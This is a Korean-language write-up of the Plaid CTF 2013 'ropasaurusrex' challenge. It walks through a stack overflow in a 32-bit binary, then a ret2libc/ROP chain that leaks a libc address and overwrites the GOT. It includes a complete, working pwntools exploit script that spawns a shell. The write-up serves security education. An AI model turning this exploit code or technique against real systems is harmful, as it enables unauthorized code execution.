---
title: "Plaid CTF 2013 — ropasaurusrex Writeup"
date: 2013-04-01
description: "Classic ret2libc / ROP chain exploit against a 32-bit Linux binary from Plaid CTF 2013"
tags: ["CTF", "PlaidCTF", "pwn", "ROP", "ret2libc", "writeup"]
categories: ["CTF"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 개요

**ropasaurusrex**는 ROP 기법을 공부하는 사람이라면 한 번쯤 풀어본다는 Plaid CTF 2013의 명작 문제다. NX와 ASLR 같은 현대적인 메모리 보호 기법을 우회하는 데 필요한 기초 개념을 익히기에 매우 적합한 문제다.

이전에 흑객 스터디에서 Hackerschool 문제로 아주 간단한 ROP를 경험한 적이 있었는데, 이 문제는 여러 자료를 인용하고 공부하며 직접 삽질하면서 풀어낸 문제라 개인적으로 의미가 깊다.

---

## 문제 분석

### 바이너리 기본 정보

파일을 실행하면 아무거나 입력했을 때 "WIN"이라는 문자열을 출력하고 종료된다.

![File information](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-2.png)

바이너리는 **32비트 ELF 실행 파일**이다. 이번에 알게 된 사실인데, `stripped`로 표시되어 있으면 main 함수의 심볼이 제거되어 GDB에서 바로 보이지 않는다.

`checksec`으로 보호 기법을 확인하면:

![Binary protections - NX enabled](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-3.png)

**핵심 관찰:**
- **NX 비트**: 활성화 (스택/힙 실행 불가)
- **ASLR**: OS 레벨에서 활성화 (Ubuntu 환경)
- **Stripped**: 심볼 테이블에서 함수명 제거됨
- **사용 함수**: `read()`와 `write()` 시스템 콜만 사용

### 취약점 발견

입력값을 조금 넣으면 정상 실행되지만:

![Small input - normal execution](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-0.png)

매우 많은 입력을 주면 세그멘테이션 폴트가 발생한다:

![Overflow input - segmentation fault](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-1.png)

단순한 BOF 문제일까? 일단 더 분석해보자.

### 역공학

IDA Pro의 Hex-Rays 디컴파일러로 main 함수를 분석하면:

![IDA analysis - main function](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-8.png)

main 함수는 간단하다. 핵심은 `vuln_func()` 안에 있다:

![IDA analysis - vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-9.png)

**취약점:**
```c
char buffer[136];
read(0, buffer, 256);  // BOF: 136바이트 버퍼에 256바이트를 읽어옴
```

`read()` 함수가 **136바이트** 버퍼에 **256바이트**를 읽어들인다. **120바이트**의 오버플로 공간이 생긴다.

### 어셈블리 직접 분석

.text 섹션의 실제 어셈블리 코드를 살펴보면:

![Assembly analysis - main and vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-11.png)

프로그램의 흐름상 read 함수 실행 후 write 함수를 실행한다. 이 두 함수만 사용한다는 점이 핵심이다.

---

## 메모리 보호 기법

### NX (No eXecute)

![NX explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-4.png)

NX란 메모리 보호 기법 중 하나로, 메모리 권한에서 쓰기(w) 권한과 실행(x) 권한을 동시에 갖지 않도록 설정하는 것이다.

예를 들어 지역변수에 입력을 받을 때 오버플로가 발생하는 바이너리가 있다고 하자. NX가 비활성화되어 있으면 지역변수 메모리에 셸코드를 넣고 ret를 조작해 실행할 수 있다. 하지만 NX가 활성화되어 있으면 메모리에 실행 권한이 없으므로 셸코드를 직접 실행할 수 없다. 따라서 기존 코드(ROP 가젯)를 활용해야 한다.

### ASLR (Address Space Layout Randomization)

![ASLR explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-5.png)

메모리상의 공격을 방어하기 위해 주소 공간 배치를 난수화시키는 기법이다. 스택, 힙, 라이브러리(libc) 등의 데이터 영역 주소를 난수화된 주소로 프로세스 주소 공간에 배치한다.

**해결책**: 런타임에 libc 주소를 누출(leak)한 후, 함수 간 오프셋을 계산해 `system()` 같은 원하는 함수에 도달한다.

---

## 익스플로잇 전략

### 1단계: 주요 주소 수집

필요한 주소들을 먼저 구한다:

```
read@plt:   0x804832c
read@got:   0x804961c
write@plt:  0x08048334
write@got:  0x08048624
pop3ret:    0x80484b6
.dynamic:   0x8049530
```

![Address collection](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-12.png)

### 2단계: libc 오프셋 계산

GDB로 바이너리를 실행해 libc 오프셋을 구한다:

![Libc offset calculation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-14.png)

libc에서의 오프셋:
```
write offset:  0xe8090
system offset: 0x3e980
read offset:   0x99880
```

`write()` 함수를 사용해 GOT에서 `write()`의 실제 주소를 누출하고, 그로부터 `system()` 주소를 계산한다.

### 3단계: ROP 가젯 찾기

함수 호출 규약(cdecl: 인자는 스택, 호출자가 정리)에 맞는 가젯을 찾는다:

```
pop3ret (0x80484b6):  pop eax; pop eax; pop eax; ret
```

![pop3ret gadget](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-15.png)

이 가젯은 스택 포인터를 함수 인자 3개만큼 앞으로 이동시키는 역할을 한다.

### 4단계: 쓰기 가능한 메모리 영역 확인

"/bin/sh" 문자열을 저장할 위치를 찾는다:

![Writable sections](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-13.png)

.data와 .bss는 8바이트밖에 저장이 불가능하다. 따라서 `0x8049530`에 위치한 **.dynamic** 영역에 "/bin/sh" 문자열을 저장하겠다.

---

## 익스플로잇 구현

### 풀이 로직

익스플로잇은 3단계로 동작한다:

**1단계:** libc 주소 누출
- `write(1, write@got, 4)`를 호출해 GOT에서 `write()`의 실제 주소를 누출
- `libc_base = 누출된_write_주소 - write_offset`
- `system_address = libc_base + system_offset`

**2단계:** 명령 문자열 쓰기
- `read(0, .dynamic, 8)`으로 "/bin/sh" 문자열을 입력받아 저장
- `read(0, read@got, 4)`로 `system()`의 주소를 입력받아 GOT의 read 엔트리를 덮어씀

**3단계:** system() 실행
- GOT의 `read()` 엔트리가 이제 `system()`을 가리킴
- "/bin/sh"가 저장된 주소를 인자로 해서 `read()`를 호출 → 실제로는 `system("/bin/sh")` 실행

### 파이썬 익스플로잇 코드

```python
from pwn import *

r = remote('localhost', 6666)
e = ELF('./ropasaurusrex')

# 정보 수집
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']

pop3ret = 0x80484b6
cmd = '/bin/sh'
dynamic = 0x8049530
write_offset = 0xe8090
system_offset = 0x3e980

# ROP 체인 페이로드 구성
payload = ''
payload += "A" * 140  # 리턴 주소까지 오버플로

# write(1, write@got, 4) - libc 주소 누출
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)           # fd = stdout
payload += p32(write_got)   # buffer = write@got
payload += p32(4)           # count = 4 bytes

# read(0, .dynamic, 8) - "/bin/sh" 문자열 읽기
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(dynamic)     # buffer = .dynamic 섹션
payload += p32(8)           # count = 8 bytes

# read(0, read@got, 4) - read()를 system()으로 덮어쓰기
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(read_got)    # buffer = read@got
payload += p32(4)           # count = 4 bytes

# 수정된 read()를 호출 (이제 system()임)
payload += p32(read_plt)
payload += 'AAAA'           # 리턴 주소 (무관)
payload += p32(dynamic)     # 첫 번째 인자: "/bin/sh" 주소

# 페이로드 전송
r.send(payload)

# 누출된 write() 주소 수신
write_libc = u32(r.recv(4))
log.info("write_libc : %s" % hex(write_libc))

# 주소 계산
libc_base = write_libc - write_offset
log.info("libc_base : %s" % hex(libc_base))

system_libc = libc_base + system_offset
log.info("system_libc : %s" % hex(system_libc))

# "/bin/sh" 문자열 전송
r.send(cmd)

# system() 주소 전송
r.send(p32(system_libc))

# 인터랙티브 셸 획득
r.interactive()
```

### 실행 결과

![Successful exploitation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-17.png)

익스플로잇이 성공적으로:
1. libc 베이스 주소를 누출하고
2. `system()` 함수의 주소를 계산하며
3. `read()`의 GOT 엔트리를 `system()`으로 덮어쓰고
4. `/bin/sh`를 실행한다

---

## 핵심 개념 정리

### ROP 체인 구성 원리

ROP (Return-Oriented Programming) 체인은 다음과 같이 동작한다:
1. `ret` 명령으로 끝나는 짧은 명령어 시퀀스(가젯)를 찾는다
2. 스택에 가젯 주소를 배치한다
3. 각 `ret`가 다음 가젯으로 점프한다
4. 함수 인자는 스택에 배치한다 (cdecl 호출 규약)

### GOT 덮어쓰기 기법

GOT(Global Offset Table)의 엔트리를 덮어써 함수 호출을 임의의 주소로 리다이렉트할 수 있다:
- GOT는 쓰기 가능하다
- 함수 포인터가 예측 가능하다
- 기존 코드 경로를 재활용할 수 있다

### 정보 누출

ASLR은 라이브러리 주소를 무작위화하지만, 다음 방법으로 우회할 수 있다:
- `write()` 같은 출력 함수로 메모리를 읽는다
- libc 내 함수들 사이의 오프셋을 미리 계산해둔다
- 누출된 함수 주소에서 베이스 주소를 역산한다

---

## 참고 자료

- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (1)](https://bpsecblog.wordpress.com/2016/03/12/pctf2013_ropasaurusrex/)
- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (2)](https://bpsecblog.wordpress.com/2017/01/20/plaidctf-ropasaurusrex/)
- [BPSec Blog - GOT and PLT explained](https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/)
- [Confus3r's writeup](http://confus3r.tistory.com/entry/Plaid-CTF-2013-ropasaurusrex)
